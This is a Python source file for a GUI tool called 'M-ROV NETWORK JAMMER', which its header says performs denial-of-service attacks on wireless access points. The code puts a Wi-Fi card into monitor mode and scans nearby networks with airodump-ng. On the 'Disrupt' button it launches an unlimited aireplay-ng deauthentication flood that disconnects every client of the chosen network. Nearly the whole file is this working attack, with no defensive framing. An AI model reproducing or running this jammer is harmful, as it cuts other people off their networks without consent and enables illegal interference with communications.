#JAM_GUI - A GUI Program capable of performing dos attack against wireless AP's

#HEADER FILES
import os                                                   #for running linux commands within the pgm
import guizero as g                                         #guizero is a graphics library
import logging                                              #for keeping logs to aid in debugging
import subprocess                                           #similar to os, but a bit more powerfull
import csv                                                  #csv is used for storing info in csv format


wireless_APs = []

#____________________________________________LOGGING___SETTINGS__________________________________________________________________________________#

#Configuring the logger
logging.basicConfig(filename="./jam_gui.log", 
	            format='%(asctime)s %(message)s', 
	            filemode='w') 

#Creating an object 
logger=logging.getLogger() 

#Setting the threshold of logger to DEBUG 
logger.setLevel(logging.DEBUG) 
#_________________________________________________________________________________________________________________________________________________#
#______________________________________________BASIC__CONFIG______________________________________________________________________________________#

#General configuration
version = "1.0"                                                 # version no displayed in title
name = "M-ROV NETWORK JAMMER"                                   # name displayed in title

#Wifi configurations
interface_name = "wlan0"
interface_in_monitor_mode = "wlan0mon"
AP_file_name = "AP_file"                                        # csv file in which output of airodump-ng command is stored

#GUI configurations (main window)
window_height = "300"
window_width  = "700"
align = "center"
title = name + version

#GUI configuration (wireless AP, list box)
l_align = "left"
l_scrollbar = "True"
l_height = "400"
l_width = "800"
l_grid = [1,1]




#_________________________________________________________________________________________________________________________________________________#

#__________________________________________________FUNCTIONS______________________________________________________________________________________#

#______________________________________________START_MONITORING___________________________________________________________________________________#

def start_adapter(interface_name):

  logger.info("entered function start_adapter()")

  logger.info("Started airmon-ng")
  airmon = subprocess.Popen(["airmon-ng","start",interface_name],stdout = subprocess.PIPE , stderr = subprocess.PIPE)
  stdout,stderr = airmon.communicate()
  
  logger.info("Started airmon-ng check kill")
  check_kill = subprocess.Popen(["airmon-ng","check","kill"],stdout = subprocess.PIPE , stderr = subprocess.PIPE)
  c_stdout,c_stderr = check_kill.communicate()
  logger.info("Exited from function start_adapter()")
  return "Note : Wifi Card is currently in MonitorMode"

  

#_________________________________________________________________________________________________________________________________________________#
#______________________________________________STOP_MONITORING____________________________________________________________________________________#

def stop_adapter(interface_in_monitor_mode):

  print("\n\n")	
  messages = []                             #to return all messages
  logger.info("entered function stop_adapter()")
  
  stop_mon = subprocess.Popen(["airmon-ng","stop",interface_in_monitor_mode],stdout = subprocess.PIPE, stderr = subprocess.PIPE)
  sm_stdout,sm_stderr = stop_mon.communicate()
  logger.info("stopped monitoring successfully")
  messages.append("Note : Wifi Card exited from Monitor mode")

  stop_mon1 = subprocess.Popen(["ifconfig","interface_name","up"],stdout = subprocess.PIPE, stderr = subprocess.PIPE)
  sm1_stdout,sm1_stderr = stop_mon1.communicate()
  logger.info("COMM :executing ifconfig wlan0 up")
  messages.append("Note : Reverting Wifi Adapter to its original state")

  stop_mon2 = subprocess.Popen(["service","network-manager","restart"],stdout = subprocess.PIPE, stderr = subprocess.PIPE)
  sm2_stdout,sm2_stderr = stop_mon2.communicate()
  logger.info("COMM : executing service network manager restart")
  messages.append("Note : Reverting Wifi Adapter to its original state")

  logger.info("Exited from function stop_adapter")
  
  return messages
#______________________________________________LOCATE_NEARBY_APS______________________________________________________________________________________#
def locate_APs(interface_in_monitor_mode):
	
  logger.info("Entered function start_jam()")

  command = "xterm -geometry -500+100 -T \"please wait for 5 second\" -e \"timeout 5 airodump-ng -w AP_file --output-format csv --write-interval 1   " + interface_in_monitor_mode +"\""
  logger.info("COMM :timeout 5s executing airodump-ng wlan0mon")
  os.system(command)
  
  #reading output from csv file
  fields = []
  rows = []

  with open(AP_file_name+"-01.csv", 'r') as csvfile: 
    # creating a csv reader object 
    csvreader = csv.reader(csvfile) 
      
    # extracting field names through first row 
    fields = next(csvreader)
    fields = next(csvreader) 

  
    # extracting each data row one by one 
    for row in csvreader: 
      rows.append(row) 
  
   
  #print('\nWifi Access Points are vulnerable to jamming are :- \n') 
  # printing the field names 
  #print(fields[0])
  #print(fields[3])
  #print(fields[13])
  #print('-'*table_width)
  #print('|%s|%s|%s|'%(fields[13].center(cell_width),fields[3].center(cell_width),fields[0].center(cell_width)))
  #print('-'*table_width)

  #wireless_APs = []                #A list which stores all wireless APs located nearby

  try:
    for row in rows: 
      if(len(row)>0 and row[0] != 'Station MAC'):
        bssid = row[0]
        channel = row[3]
        essid = row[13]
        wireless_AP = [essid,channel,bssid]  
        #print('|%s|%s|%s|'%(essid.center(cell_width),channel.center(cell_width),bssid.center(cell_width)))
        #print('-'*table_width)
        wireless_APs.append(wireless_AP)
      else:
        break	
      
  except IndexError as e:
    logger.info(e)
  logger.info("Wireless AP's found are")	
  logger.info(wireless_APs)	
  os.system("rm " + AP_file_name + "-01.csv")
  logger.info("removed csv file ")
  logger.info("Exited function start_jam()")
  return wireless_APs  
#_________________________________________________________________________________________________________________________________________________#


def gui():

	def monitor():
        	#gets status info related to monitoring mode
		status_list.append(start_adapter(interface_name))
		logger.info('entered function monitor')

	def list_APs():
		wifi_list.clear()
		#gets list of nearby APs
		nearby_APs = locate_APs(interface_in_monitor_mode)    
		for AP in nearby_APs:
			AP_name = AP[0]
			wifi_list.append(AP_name)

	def network_reset():
    	    #resets the network adapter to its original state
    	    messages = stop_adapter(interface_in_monitor_mode)
        
    	    for message in messages:
    	        status_list.append(message)

	def change_selected_ssid(value):
		#displays the selected AP in the textbox
		text_box_ssid.value = value

	def disrupt_AP():
		logger.info('disrupt ap button clicked')
		essid = text_box_ssid.value
		essid = essid.lstrip(' ')
		essid = essid.rstrip(' ')
		#disrupts the selected wireless_AP
		desired_router = " "
		logger.info("routers found are:-")
		router_found = 0
		for router in wireless_APs:
			logger.info(router)
			logger.info(router[0])
			essid1 = str(router[0])
			essid1 = essid1.lstrip(' ')
			essid1 = essid1.rstrip(' ')
			channel1 = str(router[1])
			bssid1 = str(router[2])
			logger.info('essid1 = '+ essid1)
			logger.info('essid = ' + essid)
			if essid == essid1:
				router_found = 1
				logger.info("desired router located")
				desired_router = router
				print(router)
				logger.info(router)
				status_list.append(("Locking %s communicating on channel %s with BSSID %s " %(desired_router[0],desired_router[1],desired_router[2])))
				break
		if router_found == 0:
			status_list.append(("Error!! : Could not find wireless AP with ESSID %s"%(essid)))		  
			logger.info(essid + "is chosen to be jammed")
  
		else:
			logger.info("locking airodump onto given ap")
			command = "xterm -geometry -500+100 -T 'locking channel " + desired_router[1] + "' -e ' timeout 5 airodump-ng --bssid " + desired_router[2] + " -c " + desired_router[1] + " " + interface_in_monitor_mode + " '"
			os.system(command)
			status_list.append("target locked successfullly")
			status_list.append("deauthenticating all clients from the AP (press ctrl + C to exit)")
			command = "xterm -geometry -500+100 -T 'deauthenticating all users from " + desired_router[0] + " (press ctrl+c to stop)' -e 'aireplay-ng --deauth 0 -a " + desired_router[2] + " " + interface_in_monitor_mode +  " '"
			os.system(command)
			logger.info("\n deauthenticating all clients")

		
	jammer = g.App(title = title, width = window_width, height = window_height, layout = "grid" )


	info_box = g.Box(
		jammer,
		width = 'fill',
		grid = [0,0],
		)    
	text1 = g.Text(
		jammer,
		text = "Wireless AP's in the nearby area are -",
		size = "12",
		color = "black",
		bg = None,
		font = None,
		grid = [0,0],
		align = "left",
		width = 'fill',
		height = None, 
	 
		)

	text2 = g.Text(
		jammer,
		text = "Info -",
		size = "12",
		color = "black",
		bg = None,
		font = None,
		grid = [1,0],
		align = "left",
		width = 'fill',
		height = None, 
	 
		)

	#wifi ap listbox
	wifi_list = g.ListBox(
	    jammer, 
	    grid = [0,1], 
	    align = l_align, 
	    scrollbar = l_scrollbar, 
	    height = l_height,
	    items = ["No nearby AP's found"],
	    width = l_width,
            command = change_selected_ssid,
	    )

	#status listbox
	status_list = g.ListBox(
	    jammer, 
	    grid = [1,1], 
	    align = "left", 
	    scrollbar = "True", 
	    height = "200",
	    items = ["System Initialized"],
	    width = "300",
	    )


	#A box widget that holds all buttons
	button_box = g.Box(
		jammer, width="fill",
		grid = [0,3],
		)


	#StartScan PushButton

	exit_button = g.PushButton(
		button_box,
		command = change_selected_ssid,
		text = "Scan",
		align = "left",

	    )

	#Network Reset PushButton

	network_reset = g.PushButton(
		button_box,
		command = network_reset,
		text = "Reset Network Adapter",
		align = "left",

	    )


	#Exit PushButton

	exit_button = g.PushButton(
		button_box,
		command = exit,
		text = "Exit",
		align = "left",

	    )


	#A box widget that holds selected ap
	selected_box = g.Box(
		jammer, 
		width="fill",
		grid = [0,4],
		border = True,
		)   



	text = g.Text(
		     selected_box,
		     text="Selected wireless AP is",
		     align="left",)

	text_box_ssid = g.TextBox(
			selected_box,
		        text="No Wireless AP Selected",
		        align="left",
			width = 'fill',
			)

	Disrupt = g.PushButton(
			selected_box,
		        text="Disrupt",
			command=disrupt_AP,
		        align="left",
			)

	    
	status_list.after(100,monitor)
	wifi_list.after(100,list_APs)
		
	jammer.display()

#__________________________________________________GUI_FUNCTION___________________________________________________________________________________#
'''def gui():
    #functions

    def monitor():
        #gets status info related to monitoring mode
        status_list.append(start_adapter(interface_name))

    def list_APs():

        wifi_list.clear()
        #gets list of nearby APs
        nearby_APs = locate_APs(interface_in_monitor_mode)
    
        for AP in nearby_APs:
            AP_name = AP[0]
            wifi_list.append(AP_name)

    def network_reset():
        #resets the network adapter to its original state
        messages = stop_adapter(interface_in_monitor_mode)
        
        for message in messages:
            status_list.append(message)


    main_app()
    #main app
    jammer = g.App(title = title, width = window_width, height = window_height, layout = "grid" )
    
    
    text1 = g.Text(
        jammer,
        text = "Wireless AP's in the nearby area are -",
        size = "12",
        color = "black",
        bg = None,
        font = None,
        grid = [1,0],
        align = "left",
        width = None,
        height = None, 
 
        )

    #wifi ap listbox
    wifi_list = g.ListBox(
    jammer, 
    grid = l_grid, 
    align = l_align, 
    scrollbar = l_scrollbar, 
    height = l_height,
    items = ["No nearby AP's found"],
    width = l_width,
    )

    #status listbox
    status_list = g.ListBox(
    jammer, 
    grid = [2,1], 
    align = "left", 
    scrollbar = "True", 
    height = "200",
    items = ["System Initialized"],
    width = "500",
    )


    #Network Reset PushButton

    network_reset = g.PushButton(
        jammer,
        command = network_reset,
        text = "Reset Network Adapter",
        grid = [2,3],
        align = "left"

    )

    #StartScan PushButton

    exit_button = g.PushButton(
        jammer,
        command = exit,
        text = "Scan",
        grid = [1,3],
        align = "left"

    )

    #Exit PushButton

    exit_button = g.PushButton(
        jammer,
        command = exit,
        text = "Exit",
        grid = [3,3],
        align = "left"

    )
    
    
    status_list.after(100,monitor)
    wifi_list.after(100,list_APs)
        
    jammer.display()'''
    
    
#_____________________________________________FUNCTION CALLS______________________________________________________________________________________

gui()








